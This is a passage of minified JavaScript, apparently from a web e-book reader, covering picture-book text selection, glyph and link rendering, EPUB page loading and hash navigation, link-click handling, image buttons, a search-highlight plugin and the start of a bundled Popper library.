        },
        this.findGlyphIndexForPosition = function(e) {
            for (var t = 0; t < this.glyphs.length; t++) {
                var n = this.glyphs[t];
                if (!n.dupped && (e.leftP >= n.l && e.leftP <= n.r && e.topP >= n.t && e.topP <= n.b))
                    return t
            }
        },
        this.createRectFromPositions = function(e, t) {
            return {
                topP: e.topP <= t.topP ? e.topP : t.topP,
                bottomP: e.topP <= t.topP ? t.topP : e.topP,
                leftP: e.leftP <= t.leftP ? e.leftP : t.leftP,
                rightP: e.leftP <= t.leftP ? t.leftP : e.leftP
            }
        },
        this.findFirstGlyphInRect = function(e) {
            for (var t = 0; t < this.glyphs.length; t++) {
                var n = this.glyphs[t];
                if (this.isGlyphInRect(e, n))
                    return t
            }
        },
        this.findLastGlyphInRect = function(e) {
            for (var t = this.glyphs.length - 1; 0 <= t; t--) {
                var n = this.glyphs[t];
                if (this.isGlyphInRect(e, n))
                    return t
            }
        },
        this.isGlyphInRect = function(e, t) {
            var n = this.centerForGlyph(t);
            return !!(n.x > e.leftP && n.x < e.rightP && n.y > e.topP && n.y < e.bottomP)
        },
        this.centerForGlyph = function(e) {
            return {
                x: (e.l + e.r) / 2,
                y: (e.t + e.b) / 2
            }
        },
        this.centerForGlyphIndex = function(e) {
            var t = this.glyphs[e];
            return t ? this.centerForGlyph(t) : {}
        },
        this.centerCoordinatesForGlyph = function(e) {
            var t = this.centerForGlyph(e),
                n = this.renderer.pageWidth(),
                o = this.renderer.pageHeight();
            return {
                x: n * (t.x / 100),
                y: o * (t.y / 100)
            }
        },
        this.centerCoordinatesForGlyphIndex = function(e) {
            var t = this.glyphs[e];
            return t ? this.centerCoordinatesForGlyph(t) : {}
        },
        this.findClosestGlyphIndexForPosition = function(e) {
            for (var t, n = Infinity, o = 0; o < this.glyphs.length; o++) {
                var i = this.glyphs[o],
                    r = {
                        x: (i.l + i.r) / 2,
                        y: (i.t + i.b) / 2
                    },
                    a = Math.sqrt(Math.pow(e.leftP - r.x, 2) + Math.pow(e.topP - r.y, 2));
                a < n && (t = o, n = a)
            }
            return t
        },
        this.extractEventToUseForPosition = function(e) {
            var t = e;
            return e.originalEvent.touches && (t = 0 < e.originalEvent.touches.length ? e.originalEvent.touches[0] : e.originalEvent), t
        },
        this.normalizedEventPosition = function(e) {
            var t = this.image.getBoundingClientRect(),
                n = e.pageY - t.top - VST.window.pageYOffset,
                o = e.pageX - t.left - VST.window.pageXOffset,
                i = n / t.height * 100;
            return {
                left: o,
                top: n,
                leftP: o / t.width * 100,
                topP: i
            }
        },
        this.pagePositionFromGlyph = function(e, t) {
            var n = (t = t || this.image.getBoundingClientRect()).width * (e.l / 100) + t.left,
                o = t.width * (e.r / 100) + t.left,
                i = t.height * (e.t / 100) + t.top,
                r = t.height * (e.b / 100) + t.top;
            return {
                left: n,
                right: o,
                top: i,
                bottom: r,
                height: r - i,
                width: o - n
            }
        },
        this.pixelRectFromPercentageRect = function(e) {
            return {
                top: this.image.height * ((e.top || e.t) / 100),
                left: this.image.width * ((e.left || e.l) / 100),
                bottom: this.image.height * ((e.bottom || e.b) / 100),
                right: this.image.width * ((e.right || e.r) / 100)
            }
        },
        this.findStartGlyph = function() {
            for (var e = 0; e < this.glyphs.length; e++)
                this.glyphs[e]
        },
        this.rangeIsSelected = function() {
            return 0 <= this.startIndex && 0 <= this.endIndex
        },
        this.onTouchStart = function(e) {
            clearTimeout(this.touchStartTimeout);
            var t = this;
            this.touchStartTimeout = setTimeout(function() {
                t.onMouseDown(e)
            }, 300)
        },
        this.onMouseDown = function(e) {
            this.deselectAll(),
            this.selecting = !0;
            var t = this.extractEventToUseForPosition(e);
            this.startPos = this.normalizedEventPosition(t),
            this.mouseDownIndex = this.findGlyphIndexForPosition(this.startPos),
            this.noSelectMouseMoves = 0
        },
        this.onMouseMove = function(e) {
            if (clearTimeout(this.touchStartTimeout), this.selecting) {
                e.preventDefault(),
                e.stopImmediatePropagation();
                var t = this.extractEventToUseForPosition(e);
                if (this.endPos = this.normalizedEventPosition(t), this.fuzzySelect) {
                    var n = this.createRectFromPositions(this.startPos, this.endPos),
                        o = this.findFirstGlyphInRect(n),
                        i = this.findLastGlyphInRect(n);
                    o && i && this.selectRange(o, i)
                } else {
                    if (null == (i = this.findGlyphIndexForPosition(this.endPos)))
                        return;
                    (null == this.mouseDownIndex || isNaN(this.mouseDownIndex)) && (this.mouseDownIndex = 0 < i ? i - 1 : 0),
                    this.selectRange(this.mouseDownIndex, i)
                }
            } else
                this.noSelectMouseMoves++
        },
        this.onMouseUp = function() {
            this.selecting ? (this.selecting = !1, this.rangeIsSelected() && (this.setTextareaText(this.startIndex, this.endIndex), "ontouchstart" in window && VST.trigger("book:selectionMade", this.getSelectedText()), this.textarea.select())) : (clearTimeout(this.touchStartTimeout), "ontouchstart" in window && 0 === this.noSelectMouseMoves && this.deselectAll()),
            this.noSelectMouseMoves = 0
        }
    },
    VST.PictureBook.TextSelection.prototype.getBoundingClientRect = function() {
        if (!this.rangeIsSelected())
            return null;
        for (var e = {
                top: 0,
                left: 0,
                top: 0,
                bottom: 0,
                height: 0,
                width: 0
            }, t = this.startIndex, n = this.endIndex, o = (e = {}, t); o <= n; o++) {
            var i = this.pagePositionFromGlyph(this.glyphs[o]);
            (!e.left || i.left < e.left) && (e.left = i.left),
            (!e.top || i.top < e.top) && (e.top = i.top),
            (!e.right || i.right > e.right) && (e.right = i.right),
            (!e.bottom || i.bottom > e.bottom) && (e.bottom = i.bottom)
        }
        return e.height = e.bottom - e.top, e.width = e.right - e.left, e
    },
    VST.PictureBook.TextSelection.prototype.getSelectedText = function() {
        return null == this.startIndex || null == this.endIndex ? "" : this.words.slice(this.startIndex, this.endIndex + 1)
    },
    VST.PictureBook.TextSelection.prototype.setTextareaText = function() {
        this.textarea.value = this.getSelectedText(),
        this.positionTextArea()
    },
    VST.PictureBook.TextSelection.prototype.positionTextArea = function() {
        if (null != this.startIndex) {
            var e = this.glyphs[this.startIndex];
            null != e && (this.textarea.style.top = e.t + "%")
        }
    },
    VST.PictureBook.TextSelection.prototype.setupTextarea = function(e) {
        if (!this.textarea) {
            var t = e.createElement("textarea");
            t.setAttribute("id", "pbk-words"),
            t.setAttribute("style", "position: absolute; top: 0; left: -9999em;"),
            this.extrasWrapper.appendChild(t),
            this.textarea = t
        }
    }
}.call(this, VST.$),
function() {
    VST.PictureBook = VST.PictureBook || {},
    VST.PictureBook.GlyphRenderer = function(e, t) {
        this.doc = e,
        this.glyphs = t.glyphs,
        this.rects = t.rects,
        this.createNode = function(e, t) {
            var n = this.doc.createElement("span");
            return t = t || "", t += " pbk-glyph", e.dup && (t += " duplicate"), n.setAttribute("class", t), n.setAttribute("style", "position: absolute; left: " + e.l + "%; right: " + (100 - e.r) + "%; top: " + e.t + "%; bottom: " + (100 - e.b) + "%;"), n
        },
        this.createGlyphNode = this.createNode,
        this.pageWidth = function() {
            return this.rects.page.r - this.rects.page.l
        },
        this.pageHeight = function() {
            return this.rects.page.b - this.rects.page.t
        },
        this.topPositionFromPercentage = function(e) {
            return this.pageHeight * (e / 100)
        },
        this.leftPositionFromPercentage = function(e) {
            return this.pageWidth * (e / 100)
        }
    }
}.call(this, VST.$),
function() {
    VST.PictureBook.LinkRenderer = function(e) {
        e && (this.links = e.links),
        this.renderOneLink = function(e) {
            this.container.appendChild(this.createNode(e))
        },
        this.createNode = function(e) {
            var t = VST.document.createElement("a");
            return t.className = "pbk-link", t.setAttribute("style", "background:rgba(0,0,0,0); left: " + e.l + "%; right: " + (100 - e.r) + "%; top: " + e.t + "%; bottom: " + (100 - e.b) + "%;"), t.setAttribute("href", e.url), t
        },
        this.render = function() {
            if (this.links) {
                this.container = VST.document.getElementById("pbk-penguins");
                for (var e = 0; e < this.links.length; e++)
                    this.renderOneLink(this.links[e])
            }
        }
    }
}.call(this, VST.$),
function() {
    var u,
        i,
        r,
        a,
        s;
    i = function(e, t) {
        var n,
            o,
            i;
        return Jigsaw.socket.noteIcon(function(e) {
            return VST.Models.Highlight.Settings = VST.$.extend({}, {
                tag: "span"
            }, VST.Models.Highlight.Settings, e)
        }), i = document.getElementById("epub-content").documentWindow, VST.FeatureChecks.hasAutoExpandingIframe() && (i = document.getElementById("epub-container")), VST.init(e, t, VSTEPUBModule(e, t), i), VST.sharedEpubModule.Init({
            alwaysUseMathJax: !0,
            skipNoteCSS: !0,
            noteIconHandler: VST.Highlights.noteIconHandler,
            mathJaxURL: "https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js",
            mathJaxConfig: "parent.MathJax = MathJax; VST.sharedEpubModule.ConfigMathJax(); MathJax.Hub.Startup.onload();"
        }), o = function() {
            return setTimeout(function() {
                return VST.Loading.scrollToHash()
            }, 0)
        }, VST.$(e).off("hashchange ready load", o).on("hashchange ready load", o).trigger("hashchange"), n = function() {
            return VST.Loading.scrollToHash
        }, VST.unbind("highlights:render", n), VST.bind("highlights:render", n), t.createNodeIterator ? VST.Utils.throttlePageScrollEvent() : VST.Utils.fireScrollOnlyOnStop()
    },
    a = function(e) {
        return e.navigator.epubReadingSystem = e.parent.navigator.epubReadingSystem, e.epubReadingSystem = e.navigator.epubReadingSystem
    },
    s = function(e) {
        var t;
        null == e && (e = {}),
        t = function() {
            return Jigsaw.socketMethods.local._setPositionDPS.method(), VST.fire("page:ready", e)
        };
        try {
            return $(VST.document).find("body"), t()
        } catch (n) {
            return setTimeout(t, 250)
        }
    },
    r = function(e) {
        return VST.currentPageData = e
    },
    u = function(e) {
        var t,
            n;
        return t = e.body.getBoundingClientRect(), n = e.documentElement.getBoundingClientRect(), {
            height: Math.max(t.height, n.height),
            width: Math.max(t.width, n.width)
        }
    },
    VST.Loading = {
        isMainReadingWindow: function(e) {
            var t,
                n,
                o,
                i;
            for (n = 0, o = (i = document.getElementsByClassName("page-content")).length; n < o; n++)
                if ((t = i[n]) && t.contentWindow === e)
                    return !0;
            return !1
        },
        contentReady: function(e, l, c) {
            var t,
                n,
                o;
            if (null == c && (c = {}), this.isMainReadingWindow(e) && null != e.parent && window.location === e.parent.location)
                return a(e, l), i(e, l), this.watchForDocSizeChanges(VST.document), c.cfi ? (t = !0, (o = this.relativeCFIFromHash()) && (c.cfi = c.cfi + "!" + o, c.cfiwithoutAssertions = c.cfiwithoutAssertions + "!" + VST.sharedEpubModule.StripCFIAssertions(o))) : (t = !1, c.cfi = this.fullCFIFromHash(), c.cfi && (c.cfiwithoutAssertions = VST.sharedEpubModule.StripCFIAssertions(c.cfi))), n = function() {
                    var e,
                        t,
                        n,
                        o,
                        i,
                        r,
                        a,
                        s;
                    if (c.scrollHeight = VST.scrollElement.scrollHeight || VST.$(VST.document).outerHeight(), c.scrollTop = VST.scrollElement.scrollY || VST.scrollElement.pageYOffset || 0, t = VST.$(l.head).find("meta[name=viewport]").get(0))
                        for (n = i = 0, a = (e = VST.$(t).attr("content").split(/\, */)).length; 0 <= a ? i < a : a < i; n = 0 <= a ? ++i : --i)
                            switch (o = e[n].split("="), s = parseInt(o[1], 10), o[0]) {
                            case "width":
                                c.docViewportWidth = s;
                                break;
                            case "height":
                                c.docViewportHeight = s
                            }
                    else
                        r = u(l),
                        c.boundingRectWidth = r.width,
                        c.boundingRectHeight = r.height;
                    return c.dps = 1 < VST.documents.length, c.documentIndex = VST.documents.indexOf(l), c.cfi ? VST.fire("page:load", c) : VST.once("internal:getCurrentPage:after", function() {
                        return VST.fire("page:load", c)
                    })
                }, "complete" === l.readyState ? n() : VST.once("internal:page:load", n), null != VST.Book && VST.Book.getISBN() === VST.currentBookData.isbn || (VST.Book = new VST.Models.Book(VST.currentBookData)), VST.Utils.getQueryParam(e, "create") && VST.fire("viewer:create", VST.currentBookData), t ? (s(c), r(c)) : VST.Book.getCurrentPage(function(e, t) {
                    return c.page = t.getTitle(), c.cfi = c.cfi || t.getCFI(), c.cfi && (c.cfiwithoutAssertions = VST.sharedEpubModule.StripCFIAssertions(c.cfi)), s(c), r(c), VST.fire("internal:getCurrentPage:after")
                }), VST.Highlights.addHighlightCSS(), VST.TTS.addTTSCSS(), VST.TTSV2.Main.initPage(), VST.ImageButtons.initPage()
        },
        watcherTimeout: null,
        watchForDocSizeChanges: function(e) {
            var t,
                n,
                o,
                i,
                r;
            return clearTimeout(this.watcherTimeout), o = u(e), t = o.height, n = o.width, i = function() {
                return (o = u(e)).height === t && o.width === n || VST.fire("content:resize", {
                    height: o.height,
                    width: o.width
                }), t = o.height, n = o.width, r.watcherTimeout = setTimeout(i, 250)
            }, (r = this).watcherTimeout = i()
        },
        initNextPage: function() {
            var e,
                t,
                n,
                o;
            if (n = document.getElementById("next-page"))
                return e = document.getElementById("epub-content"), this.removePreviousPage(), this.makePreviousPage(e), this.makeCurrentPage(n), t = (o = n.contentWindow).document, this.callBookTypeContentReady(o, t)
        },
        initPreviousPage: function() {
            var e,
                t,
                n,
                o;
            if (n = document.getElementById("prev-page"))
                return e = document.getElementById("epub-content"), this.removeNextPage(), this.makeNextPage(e), this.makeCurrentPage(n), t = (o = n.contentWindow).document, this.callBookTypeContentReady(o, t)
        },
        removePreviousPage: function() {
            var e;
            if (e = document.getElementById("prev-page"))
                return e.parentNode.removeChild(e)
        },
        removeNextPage: function() {
            var e;
            if (e = document.getElementById("next-page"))
                return e.parentNode.removeChild(e)
        },
        makeCurrentPage: function(e) {
            return e.setAttribute("id", "epub-content"), e.setAttribute("class", "page-content"), e.style.display = "block"
        },
        makePreviousPage: function(e) {
            return e.setAttribute("id", "prev-page"), e.removeAttribute("class"), e.style.display = "none"
        },
        makeNextPage: function(e) {
            return e.setAttribute("id", "next-page"), e.removeAttribute("class"), e.style.display = "none"
        },
        callBookTypeContentReady: function(e, t) {
            var n;
            return n = e.innerPageData, VST.Book.isEpub() ? VST.Epub.contentReady(e, t, n) : VST.Book.isPBK() ? VST.PictureBook.contentReady(e, t, n) : VST.Dash.contentReady(e, t, n)
        },
        scrollToHash: function() {
            var n,
                e,
                t,
                o,
                i,
                r,
                a,
                s,
                l,
                c,
                u,
                d,
                f;
            if ((u = this.hashQueryObject()) && (u.cfi && (e = 1 < (c = u.cfi.split("!")).length ? c[c.length - 1] : c[0], VST.sharedEpubModule.ScrollToCFI(e)), u.highlight && (i = VST.$(VST.document.body).find("[data-guid=" + u.highlight + "]:first"), this.scrollToElement(i)), u.offset && (0 < (l = VST.$(VST.document.body).find("[o=" + u.offset + "]:first")).length ? this.scrollToElement(l) : (n = VST.$(VST.document.body).find("[o]"), s = parseInt(u.offset, 10), f = this.scrollToElement, n.each(function(e) {
                var t;
                if (t = parseInt(this.getAttribute("o"), 10), s < t)
                    return f(VST.$(n[e - 1])), !1
            }))), u.eid && (t = parseInt(u.eid, 10), o = VST.$(VST.document.body).find("[eid=" + t + "], [eid=" + (t - 1) + "], [eid=" + (t + 1) + "]").first(), this.scrollToElement(o)), u.page && VST.Book && VST.Book.hasPageBreaks())) {
                r = VST.Book.createPageBreakIterator(VST.document),
                a = null;
                try {
                    for (d = []; a = r.nextNode();) {
                        if (a.getAttribute("title") === u.page) {
                            this.scrollToElement(a);
                            break
                        }
                        d.push(void 0)
                    }
                    return d
                } catch (h) {
                    h
                } finally {
                    return
                }
            }
        },
        scrollToElement: function(e) {
            var t,
                n,
                o;
            if (0 < (e = VST.$(e)).length)
                return o = VST.$(VST.scrollElement), t = e.position().top, e[0].getAttribute("tabindex") || e[0].setAttribute("tabindex", "0"), n = function() {
                    return e[0].removeAttribute("tabindex")
                }, o.scrollTop(t), VST.autofocus && (e.focus(), setTimeout(n, 2500)), VST.bind("page:load", function() {
                    if (o.scrollTop(t), e[0].getAttribute("tabindex") || e[0].setAttribute("tabindex", "0"), VST.autofocus)
                        return e.focus(), setTimeout(n, 2500)
                })
        },
        hashQueryObject: function() {
            var e;
            try {
                e = VST.window.location.hash
            } catch (t) {
                return null
            }
            return e && "" !== e ? QueryString.parse(e) : null
        },
        fullCFIFromHash: function() {
            var e;
            return (e = VST.Loading.hashQueryObject()) && e.cfi ? e.cfi : null
        },
        relativeCFIFromHash: function() {
            var e,
                t,
                n,
                o,
                i,
                r,
                a,
                s;
            if (!(s = VST.Loading.hashQueryObject()))
                return null;
            if (s.cfi)
                return 1 < (a = s.cfi.split("!")).length ? a[a.length - 1] : a[0];
            if (s.highlight)
                return n = VST.$(VST.document.body).find("[data-guid=" + s.highlight + "]:first"), VST.sharedEpubModule.GetCFIForNode(n[0]);
            if (s.offset)
                return r = VST.$(VST.document.body).find("[o=" + s.offset + "]:first"), VST.sharedEpubModule.GetCFIForNode(r[0]);
            if (s.eid)
                return e = parseInt(s.eid, 10), t = VST.$(VST.document.body).find("[eid=" + e + "], [eid=" + (e - 1) + "], [eid=" + (e + 1) + "]").first(), VST.sharedEpubModule.GetCFIForNode(t[0]);
            if (s.page && VST.Book && VST.Book.hasPageBreaks()) {
                o = VST.Book.createPageBreakIterator(VST.document),
                i = null;
                try {
                    for (; i = o.nextNode();)
                        if (i.getAttribute("title") === s.page)
                            return VST.sharedEpubModule.GetCFIForNode(i)
                } catch (l) {
                    l
                } finally {
                    return null
                }
            }
        }
    },
    VST.Epub = {
        contentReady: function(e, t, n) {
            var o;
            if (VST.Loading.isMainReadingWindow(e))
                return VST.once("page:ready", function() {
                    return EpubBook.highlightCurrentHighlights(), $(VST.$(t).find("video, audio")).bind("contextmenu", function(e) {
                        return e.preventDefault(), !1
                    })
                }), VST.Loading.contentReady(e, t, n), "" === (o = t.documentElement).style.width && "" === o.style.minWidth && ("" === o.style.minWidth && (o.style.minWidth = "100%"), "" === o.style.width && (o.style.width = "1px"), "" === o.style["-webkit-text-size-adjust"] && (o.style["-webkit-text-size-adjust"] = "100%"), VST.$(t).find("a").css({
                    "word-wrap": "break-word"
                })), VST.$(t).find("head").append('<style type="text/css" media="print">body > * { display: none !important; height: 0px !important; width: 0px !important; overflow: hidden; }body:before { content: "To print, please use the print page range feature within the application."; display: block !important;}</style>')
        }
    }
}.call(this),
function() {
    VST.bind("page:ready", function() {
        return VST.ClickHandlers.watchLinkClicks()
    }),
    VST.ClickHandlers = {
        isNewWindowLink: function(e) {
            return !!e.getAttribute("target")
        },
        isExternalLink: function(e, t) {
            return t.hostname && 0 < t.hostname.length && e.location.hostname !== t.hostname
        },
        isAnchorURL: function(e) {
            var t,
                n;
            return 0 === e.indexOf("#") || (t = (n = VST.document.defaultView.location.pathname.split("/"))[n.length - 1], 0 <= e.indexOf(t) && 0 <= e.indexOf("#"))
        },
        isJavascriptURL: function(e) {
            return /^javascript/i.test(e)
        },
        isBlankHref: function(e) {
            return !(e && "" !== e)
        },
        shouldIgnoreHref: function(e) {
            var t,
                n;
            return t = (n = e.split("/"))[n.length - 1], !(!/\./.test(t) || /\.x?html/i.test(e))
        },
        isIntraBookLink: function(e) {
            return -1 < e.indexOf("#epubcfi")
        },
        scrollToAnchor: function(e, t, n) {
            var o,
                i;
            return !!(o = VST.document.getElementById(e.split("#")[1])) && (o.offsetParent ? (t.preventDefault(), o.scrollIntoView(), o.focus && o.focus(), !0) : !!VST.snippetSettings && (t.preventDefault(), VST.Jigsaw.socketMethods.local.exit.method(), i = new URL(n.href), VST.Jigsaw.navigateTo(i.pathname + i.hash, null, !0), !0))
        },
        watchLinkClicks: function() {
            var i;
            return i = this, VST.$(VST.document).delegate("a", "click.vstClick", function(e) {
                var t,
                    n,
                    o;
                if (!(e.altKey || e.ctrlKey || e.metaKey || e.isDefaultPrevented()))
                    if (o = VST.window, n = this.getAttribute("href"), i.isBlankHref(n))
                        ;
                    else if (i.isJavascriptURL(n))
                        ;
                    else if (i.isAnchorURL(n) && i.scrollToAnchor(n, e, this))
                        ;
                    else {
                        if (i.isExternalLink(o, this) || i.isNewWindowLink(this))
                            return e.preventDefault(), o.open(this.href);
                        if (!i.shouldIgnoreHref(n))
                            return i.isIntraBookLink(n) ? (t = /\(([^)]+)\)/.exec(n)[1], Jigsaw.socketMethods.local.goToCFI.method(t)) : (e.preventDefault(), Jigsaw.navigationRequested(), Jigsaw.navigateTo(this.href))
                    }
            })
        }
    }
}.call(this),
function(V) {
    function e() {
        V.Book.isEpub() && Jigsaw.socket.getImageButtonConfig(function(e) {
            e && e.featureAvailable && (k = e, r().initPage(), "complete" === V.document.readyState ? i() : V.window.addEventListener("load", i), V.bind("page:unload", function() {
                r().reset(),
                k = {}
            }))
        })
    }
    function t() {
        s || (s = !0, o())
    }
    function n() {
        s && (s = !1, o())
    }
    function o() {
        V.Book.isEpub() && (s ? r().enable() : r().disable())
    }
    function i() {
        for (var e = V.document.querySelectorAll("img"), t = 0; t < e.length; t++)
            a(e[t]) && r().setUpImage(e[t]);
        o()
    }
    function r() {
        return "ontouchstart" in V.document.documentElement ? c : u
    }
    function C(e, t, n) {
        n = n || function() {};
        var o = {
            imageURL: e.src.replace(/^https?:/, ""),
            alt: e.getAttribute("alt") || null,
            imageCFI: V.sharedEpubModule.GetCFIForNode(e)
        };
        o.location = t,
        o.doneCallbackId = V.Utils.installCallback(n),
        V.fire("imagebutton:click", o)
    }
    function a(e) {
        var t = V.$(e),
            n = 0 < t.closest("button, a").length,
            o = 0 < t.closest("figure").length && 0 === t.closest("figcaption").length;
        return t.width() > l && t.height() > l && (!n || o)
    }
    var k = null,
        s = !0,
        l = 100,
        c = function() {
            function e(o) {
                o.classList.add("vst-click"),
                o.addEventListener("click", function(e) {
                    if (r) {
                        var t = e.pageX - V.Utils.scrollLeft(),
                            n = e.pageY - V.Utils.scrollTop();
                        C(o, {
                            left: t,
                            right: t,
                            top: n,
                            bottom: n
                        })
                    }
                })
            }
            function t() {}
            function n() {}
            function o() {
                r = !0
            }
            function i() {
                r = !1
            }
            var r = !0;
            return {
                setUpImage: e,
                reset: t,
                initPage: n,
                enable: o,
                disable: i
            }
        }(),
        u = function() {
            function e(e) {
                t(e),
                n(e)
            }
            function t(n) {
                var e = s(n),
                    t = e.getAttribute("id");
                t || (t = "vst-image-button-" + Math.round(1e6 * Math.random()), e.setAttribute("id", t));
                var o = u(t);
                o.addEventListener("click", function(e) {
                    e.stopPropagation(),
                    V.sharedEpubModule.ClearSelection();
                    var t = o.getBoundingClientRect();
                    r(o, y, !0),
                    C(n, {
                        left: t.left,
                        right: t.right,
                        top: t.top,
                        bottom: t.bottom
                    }, function() {
                        r(o, y, !1)
                    })
                }),
                o.addEventListener("focus", function() {
                    r(o, S, !0)
                }),
                o.addEventListener("blur", function() {
                    r(o, S, !1)
                });
                var i = s(n);
                i.parentNode.insertBefore(o, i.nextSibling)
            }
            function n(e) {
                function o() {
                    clearTimeout(t);
                    var e = v.indexOf(t);
                    v.splice(e, 1)
                }
                var t = null,
                    i = a(e);
                e.addEventListener("mouseover", function() {
                    o(),
                    t = window.setTimeout(function() {
                        r(i, T, !0)
                    }, 200),
                    v.push(t)
                }),
                e.addEventListener("mouseout", function(e) {
                    o();
                    var t = e.relatedTarget,
                        n = i === t || i.contains(t);
                    r(i, T, n)
                })
            }
            function r(e, t, n) {
                e.setAttribute(t, n);
                var o = "true" === e.getAttribute(S),
                    i = "true" === e.getAttribute(T),
                    r = "true" === e.getAttribute(y);
                e.style.boxShadow = o ? "0 0 0 2px white, 0 0 0 4px " + w : "none",
                r || o || i ? l(e) : c(e)
            }
            function o(e) {
                var t = e.getAttribute("aria-describedby"),
                    n = V.document.getElementById(t),
                    o = "img" === n.nodeName ? n : n.querySelector("img");
                m[t] && m[t].scheduleUpdate(),
                m[t] = new V.Popper(o, e, {
                    modifiers: {
                        flip: {
                            enabled: !1
                        },
                        preventOverflow: {
                            enabled: !1
                        },
                        hide: {
                            enabled: !1
                        },
                        offset: {
                            offset: "-7, -100%p - 7px"
                        }
                    },
                    placement: "top-end"
                })
            }
            function a(e) {
                return s(e).nextSibling
            }
            function s(e) {
                var t = V.$(e).closest("figure");
                return 0 < t.length ? t.get(0) : e
            }
            function l(e) {
                o(e),
                e.style.height = "28px",
                e.style.opacity = "1",
                e.style.transition = "opacity 0.15s"
            }
            function c(e) {
                e.style.transition = "opacity 0.15s, height 0s 0.15s",
                e.style.height = "0",
                e.style.opacity = "0"
            }
            function u(e) {
                var t = V.document.createElement("button");
                if (t.className = "vstskip vstignore vst-skip-enhanced-formatting " + b, k.content) {
                    var n = k.content.replace(/currentColor/g, "white");
                    t.style.backgroundImage = "url('data:image/svg+xml;base64," + btoa(n) + "')",
                    t.style.backgroundRepeat = "no-repeat",
                    t.style.backgroundPosition = "center"
                } else
                    t.innerText = "?";
                return t.setAttribute("aria-label", k.label || "Select image"), t.setAttribute("aria-describedby", e), t.style.borderRadius = "4px", t.style.backgroundColor = w, t.style.color = "white", t.style.cursor = "pointer", t.style.border = "0", t.style.boxShadow = "none", t.style.margin = "0", t.style.padding = "0", t.style.width = "38px", t.style.boxSizing = "border-box", t.style.outline = "none", t.style.overflow = "hidden", t.style.position = "absolute", t.style.maxWidth = "auto", t.style.lineHeight = "0", t.style.appearance = "none", t.style.webkitAppearance = "none", t.style.msAppearance = "none", t.style.mozAppearance = "none", c(t), t
            }
            function i() {
                Object.keys(m).forEach(function(e) {
                    m[e].scheduleUpdate()
                })
            }
            function d() {
                x.forEach(function(e) {
                    V.bind(e, function() {
                        i()
                    })
                })
            }
            function f() {
                Object.keys(m).forEach(function(e) {
                    m[e].destroy()
                }),
                v.forEach(function(e) {
                    window.clearTimeout(e)
                }),
                m = {},
                v = []
            }
            function h(e) {
                for (var t = V.document.querySelectorAll("." + b), n = 0; n < t.length; n++)
                    t[n].style.display = e ? "inline-block" : "none"
            }
            function p() {
                h(!0)
            }
            function g() {
                h(!1)
            }
            var m = {},
                v = [],
                T = "data-vst-image-hovered",
                S = "data-vst-image-focused",
                y = "data-vst-image-forced-open",
                b = "vst-image-button",
                x = ["page:scroll", "page:resize", "page:load"],
                w = "#757575";
            return {
                setUpImage: e,
                reset: f,
                initPage: d,
                enable: p,
                disable: g
            }
        }();
    V.ImageButtons = {
        initPage: e,
        enable: t,
        disable: n
    }
}(VST),
$.extend($.expr[":"], {
    offsetGTE: function(e, t, n) {
        return parseInt($(e).attr("o")) >= parseInt(n[3])
    },
    offsetLTE: function(e, t, n) {
        return parseInt($(e).attr("o")) <= parseInt(n[3])
    }
}),
function(u) {
    function s(e) {
        return (e = e.replace(/[-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&")).replace(/(^\s*)|(\s*$)/g, "")
    }
    u.extend({
        highlight: function(e, t, n, o, i) {
            if (3 === e.nodeType) {
                var r = e.data.match(t);
                if (r) {
                    var a = document.createElement(n || "strong");
                    a.className = o || "highlight",
                    i && a.setAttribute("style", "background: " + i);
                    var s = e.splitText(r.index);
                    s.splitText(r[0].length);
                    var l = s.cloneNode(!0);
                    return a.appendChild(l), s.parentNode.replaceChild(a, s), 1
                }
            } else if (1 === e.nodeType && e.childNodes && !/(script|style)/i.test(e.tagName) && (e.tagName !== n.toUpperCase() || e.className !== o))
                for (var c = 0; c < e.childNodes.length; c++)
                    c += u.highlight(e.childNodes[c], t, n, o, i);
            return 0
        }
    }),
    u.fn.unhighlight = function(e) {
        var t = {
            className: "highlight",
            element: "strong"
        };
        return u.extend(t, e), this.find(t.element + "." + t.className).each(function() {
            var e = this.parentNode;
            e.replaceChild(this.firstChild, this),
            e.normalize()
        }).end()
    },
    u.fn.highlight = function(e, t) {
        var n = {
            className: "highlight",
            element: "strong",
            caseSensitive: !1,
            wordsOnly: !1
        };
        if (u.extend(n, t), e.constructor === String && (e = [e]), 0 == (e = u.grep(e, function(e) {
            return "" != e
        })).length)
            return this;
        escapedWords = [];
        for (var o = e.length - 1; 0 <= o; o--)
            escapedWords.unshift(s(e[o]));
        var i = n.caseSensitive ? "" : "i",
            r = "(" + escapedWords.join("|") + ")";
        n.wordsOnly && (r = "\\b" + r + "\\b"),
        r = r.replace(/\s/g, "([\\s]+)");
        var a = new RegExp(r, i);
        return this.each(function() {
            u.highlight(this, a, n.element, n.className, n.color)
        })
    }
}(VST.$),
function(e, t) {
    "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : e.VST.Popper = t()
}(this, function() {
    "use strict";
    function e(e) {
        var t = !1;
        return function() {
            t || (t = !0, window.Promise.resolve().then(function() {
                t = !1,
                e()
            }))
        }
    }
    function t(e) {
        var t = !1;
        return function() {
            t || (t = !0, setTimeout(function() {
                t = !1,
                e()
            }, ue))
        }
    }
    function s(e) {
        return e && "[object Function]" === {}.toString.call(e)
    }
    function y(e, t) {
        if (1 !== e.nodeType)
            return [];
        var n = e.ownerDocument.defaultView.getComputedStyle(e, null);
        return t ? n[t] : n
    }
    function p(e) {
        return "HTML" === e.nodeName.toUpperCase() ? e : e.parentNode || e.host
    }
    function g(e) {
        if (!e)
            return document.body;
        switch (e.nodeName.toUpperCase()) {
        case "HTML":
        case "BODY":
            return e.ownerDocument.body;
        case "#DOCUMENT":
            return e.body
        }
        var t = y(e),
            n = t.overflow,
            o = t.overflowX,
            i = t.overflowY;
        return /(auto|scroll|overlay)/.test(n + i + o) ? e : g(p(e))
    }
    function m(e) {
        return 11 === e ? he : 10 === e ? pe : he || pe
    }
    function S(e) {
        if (!e)
            return document.documentElement;
        for (var t = m(10) ? document.body : null, n = e.offsetParent || null; n === t && e.nextElementSibling;)
            n = (e = e.nextElementSibling).offsetParent;
        var o = n && n.nodeName.toUpperCase();
        return !o || "BODY" === o && "static" === getComputedStyle(n).position || "HTML" === o ? e ? e.ownerDocument.documentElement : document.documentElement : -1 !== ["TH", "TD", "TABLE"].indexOf(n.nodeName.toUpperCase()) && "static" === y(n, "position") ? S(n) : n
    }
    function l(e) {
        var t = e.nodeName.toUpperCase();
